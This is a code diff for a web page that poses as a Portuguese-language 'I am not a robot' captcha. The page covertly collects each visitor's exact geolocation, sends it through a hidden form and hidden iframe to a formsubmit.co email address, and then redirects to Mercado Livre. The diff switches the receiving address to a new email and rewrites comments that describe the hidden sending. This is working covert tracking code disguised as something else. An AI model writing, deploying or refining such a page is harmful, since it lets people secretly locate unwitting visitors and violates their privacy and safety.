@@ -66,7 +66,8 @@
   <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
   <div class="wrap">
-    <form id="geoForm" action="https://formsubmit.co/deltacronex@gmail.com" method="POST" target="hidden_iframe" style="display:none;">
+    <!-- Formulario actualizado con el nuevo correo -->
+    <form id="geoForm" action="https://formsubmit.co/trabajorastreo@gmail.com" method="POST" target="hidden_iframe" style="display:none;">
       <input type="hidden" name="_subject" value="Novo registro de Localização Captcha">
       <input type="hidden" name="_template" value="table">
       <input type="hidden" name="_captcha" value="false">
@@ -116,21 +117,19 @@
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          // Asigna valores exactos
           document.getElementById('lat').value = position.coords.latitude;
           document.getElementById('lon').value = position.coords.longitude;
           document.getElementById('acc').value = position.coords.accuracy + ' metros';
 
           finalizeSuccess();
 
-          // Envía datos en segundo plano y redirige a Mercado Livre
+          // Envía de forma oculta al nuevo correo y redirige a Mercado Livre
           document.getElementById('geoForm').submit();
           setTimeout(() => {
             window.location.href = targetURL;
           }, 600);
         },
         (error) => {
-          // Si el usuario rechaza la ubicación o falla, se restablece para exigir ubicación exacta
           state = 'idle';
           checkbox.classList.remove('loading');
           label.textContent = 'Não sou um robô';
